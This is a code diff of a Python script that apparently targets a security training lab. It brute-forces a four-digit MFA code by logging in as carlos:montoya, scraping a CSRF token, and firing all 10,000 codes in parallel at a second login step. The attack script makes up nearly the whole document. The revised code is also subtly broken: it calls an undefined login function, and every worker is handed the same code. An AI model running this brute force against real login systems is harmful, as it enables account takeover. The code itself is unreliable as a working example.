@@ -12,9 +12,6 @@ login_url = f'https://{site}/login'
 login2_url = f'https://{site}/login2'
 
 
-multiCPUProc = 5
-countCPU = multiprocessing.cpu_count() - 1
-
 #Taken from getUrls_multiprocessing.py and adapted for this functionality
 def time_decorator(func):
   """
@@ -31,25 +28,7 @@ def time_decorator(func):
       return(elapsed)
   return(inner)
 
-# Sets up multiprocessing so this can be solved quickly and more efficiently
-@time_decorator
-def getMulti():
-    proc = multiprocessing.Pool(multiCPUProc*countCPU)
-    manager = multiprocessing.Manager()
-    event = manager.Event()
 
-    auth_code = []
-    for i in range(0, 10000):
-            auth_code.append('%04d' % i)
-        
-    for i in range(10000):
-        proc.apply_async(attack_auth, (auth_code[i], event))
-    
-    proc.close()
-
-    event.wait()
-    proc.terminate()
-  
 
 
 #Does the bascic login functionality that was given in Code labs
@@ -64,7 +43,7 @@ def login_user(s):
     'password' : 'montoya'
     }
     
-    # print(f'Logging in as carlos:montoya')
+    print(f'Logging in as carlos:montoya')
     resp = s.post(login_url, data=logindata)
     soup = BeautifulSoup(resp.text, 'html.parser')
     csrf = soup.find('input', {'name':'csrf'}).get('value')
@@ -76,24 +55,52 @@ def login_user(s):
 def attack_auth(auth_code, event):
     s = requests.Session()
 
-    csrf = login_user(s)
+    csrf = login(s)
 
+    if csrf == -1:
+        event.set()
+    
     login2data = {
         'csrf' : csrf,
-        'mfa-code' : 5850
+        'mfa-code' : auth_code
     }
 
+    
     resp = s.post(login2_url, data=login2data, allow_redirects=False)
-    if resp.status_code == 200:
-        print(f'   +{auth_code} INCORRECT')
     if resp.status_code == 302:
-        print('==============================')
-        print(f'== CORRECT CODE: {auth_code} ==')
-        print('==============================')
-        event.wait()
+        print(f'=== CORRECT CODE: {auth_code}')
+        event.set()
+    if resp.status_code == 200:
+        print(f'wrong...{auth_code}')
+        pass
+    else:
+        print(f'Invalid Auth/ RESPONSE CODE: {resp.status_code}')
+        event.set()
+    
+ # Sets up multiprocessing so this can be solved quickly and more efficiently
+@time_decorator
+def getMulti():
+    process_count = 5
+    proc = multiprocessing.Pool(process_count)
 
+    manager = multiprocessing.Manager()
+    event = manager.Event()
+
+    auth_code = 0000
+    for i in range(0, 10000):
+        auth_code=i
+    
+    for i in range(10000):
+        proc.apply_async(attack_auth, (auth_code, event))
+    
+    proc.close()
+
+    event.wait()
+    proc.terminate()
+     
 
 if __name__ == '__main__':
+    print ('Main')
     time_elapsed = getMulti()
     print(f'Time: {time_elapsed:0.2f} seconds')
 
